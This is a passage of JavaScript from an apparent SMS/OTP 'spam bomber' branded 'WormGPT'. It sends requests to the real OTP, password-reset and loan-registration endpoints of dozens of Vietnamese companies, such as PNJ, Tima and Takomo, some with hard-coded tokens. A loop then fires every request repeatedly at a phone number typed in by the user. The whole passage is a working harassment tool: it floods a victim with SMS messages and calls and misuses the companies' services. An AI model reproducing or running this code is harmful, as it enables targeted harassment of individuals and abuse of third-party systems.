            body: 'action=verify-registration-info&phoneNumber=' + encodeURIComponent(phone) + '&refCode='
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_modcha35
        (phone) => fetch('https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)' },
            body: 'clientType=ios&countryCode=VN&device=iPhone15,3&os_version=iOS_17.0.2&platform=ios&revision=11224&username=' + encodeURIComponent(phone) + '&version=1.28'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_Bibabo
        (phone) => fetch('https://one.bibabo.vn/api/v1/login/otp/createOtp?phone=' + encodeURIComponent(phone) + '&reCaptchaToken=undefined&appId=7&version=2', {
            method: 'GET',
            headers: { 'User-Agent': 'bibabo/522 CFNetwork/1474 Darwin/23.0.0' }
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_MOCA
        (phone) => fetch('https://moca.vn/moca/v2/users/role?phoneNumber=' + encodeURIComponent(phone), {
            method: 'GET',
            headers: { 'User-Agent': 'Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)' }
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_pantio
        (phone) => fetch('https://api.suplo.vn/v1/auth/customer/otp/sms/generate?domain=pantiofashion.myharavan.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'phoneNumber=' + encodeURIComponent(phone)
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_Routine
        (phone) => fetch('https://routine.vn/customer/otp/send/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'telephone=' + encodeURIComponent(phone) + '&isForgotPassword=0'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_vayvnd
        (phone) => fetch('https://api.vayvnd.vn/v2/users/password-reset', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'site-id': '3' },
            body: JSON.stringify({ login: phone, trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2' })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_tima
        (phone) => fetch('https://tima.vn/Borrower/RegisterLoanCreditFast', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'application_full_name=Nguyen+Van+A&application_mobile_phone=' + encodeURIComponent(phone) + '&CityId=1&DistrictId=16&rules=true&TypeTime=1&application_amount=0&application_term=0&UsertAgent=Mozilla/5.0&IsApply=1&ProvinceName=Thanh+pho+Ha+Noi&DistrictName=Huyen+Soc+Son&product_id=2'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_moneygo
        (phone) => fetch('https://moneygo.vn/dang-ki-vay-nhanh', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: '_token=X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV&total=56688000&phone=' + encodeURIComponent(phone) + '&agree=1'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_takomo
        (phone) => fetch('https://lk.takomo.vn/api/4/client/otp/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ data: { phone: phone, code: 'resend', channel: 'ivr' } })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_paynet
        (phone) => fetch('https://merchant.paynetone.vn/User/GetOTP', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: 'MobileNumber=' + encodeURIComponent(phone) + '&IsForget=N'
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_pico
        (phone) => fetch('https://auth.pico.vn/user/api/auth/login/request-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: JSON.stringify({ phone: phone })
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_PNJ
        (phone) => fetch('https://www.pnj.com.vn/customer/otp/request', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: '_method=POST&_token=0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU&type=zns&phone=' + encodeURIComponent(phone)
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),

        // send_otp_via_TINIWORLD
        (phone) => fetch('https://prod-tini-id.nkidworks.com/auth/tinizen', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            body: '_csrf=&clientId=609168b9f8d5275ea1e262d6&redirectUrl=https://tiniworld.com&phone=' + encodeURIComponent(phone)
        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
    ];

    // Danh sách tên service tương ứng với từng hàm
    const serviceNames = [
        'Sapo', 'Viettel', 'Medicare', 'TV360', 'DienMayXanh', 'KingFood', 'Mocha',
        'FPT_DK', 'FPT_MK', 'VIEON', 'GHN', 'LotteMart', 'DONGCRE', 'Shopee', 'TGDD',
        'FPTSHOP', 'WinMart', 'Vietloan', 'Lozi', 'F88', 'Spacet', 'Vinpearl', 'Traveloka',
        'Dongplus', 'LongChau', 'LongChau1', 'GalaxyPlay', 'Emart', 'Ahamove', 'ViettelMoney',
        'XanhSM', 'XanhSM_Zalo', 'Popeyes', 'ACHECKIN', 'Watsons', 'HoangPhuc', 'FMcom',
        'Reebok', 'TheFaceShop', 'BeautyBox', 'Futabus', 'ViettelPost', 'MyViettel2',
        'MyViettel3', 'TokyoLife', '30shine', 'Cathaylife', 'Dominos', 'Vinamilk',
        'Batdongsan', 'GUMAC', 'FAHASA', 'Hopiness', 'Modcha35', 'Bibabo', 'MOCA',
        'Pantio', 'Routine', 'VayVND', 'Tima', 'Moneygo', 'Takomo', 'Paynet', 'Pico',
        'PNJ', 'TINIWORLD'
    ];

    // ----- HÀM SPAM CHÍNH (chạy tuần tự để tránh lỗi) -----
    async function runSpam(phone, count) {
        if (running) {
            addLog('⚠️ Đang chạy, vui lòng đợi hoặc nhấn Dừng', 'fail');
            return;
        }
        if (!phone || phone.length < 9) {
            addLog('❌ Số điện thoại không hợp lệ', 'fail');
            return;
        }
        let total = parseInt(count) || 1;
        if (total < 1) total = 1;
        if (total > 10) total = 10;

        running = true;
        stopRequested = false;
        addLog(`🚀 Bắt đầu spam ${total} lượt cho ${phone}`, 'info');

        for (let i = 0; i < total; i++) {
            if (stopRequested) break;
            addLog(`--- Lượt ${i+1}/${total} ---`, 'info');

            for (let j = 0; j < spamFunctions.length; j++) {
                if (stopRequested) break;
                try {
                    const result = await spamFunctions[j](phone);
                    const name = serviceNames[j] || 'Service';
                    if (result === 'OK') {
                        addLog(`✅ ${name} -> Gửi thành công`, 'success');
                    } else {
                        addLog(`❌ ${name} -> Thất bại`, 'fail');
                    }
                } catch (e) {
                    const name = serviceNames[j] || 'Service';
                    addLog(`⚠️ ${name} -> Lỗi: ${e.message || 'unknown'}`, 'fail');
                }
                await new Promise(r => setTimeout(r, 150));
            }

            if (i < total - 1 && !stopRequested) {
                addLog(`⏳ Chờ 2 giây...`, 'info');
                await new Promise(r => setTimeout(r, 2000));
            }
        }

        running = false;
        if (stopRequested) {
            addLog('⏹️ Đã dừng theo yêu cầu', 'fail');
        } else {
            addLog('🏁 Hoàn thành!', 'success');
        }
    }

    // ----- SỰ KIỆN START -----
    startBtn.addEventListener('click', function() {
        const phone = phoneInput.value.trim();
        const count = parseInt(countInput.value) || 1;
        runSpam(phone, count);
    });

    addLog('🔥 WormGPT sẵn sàng, chờ lệnh...', 'info');
})();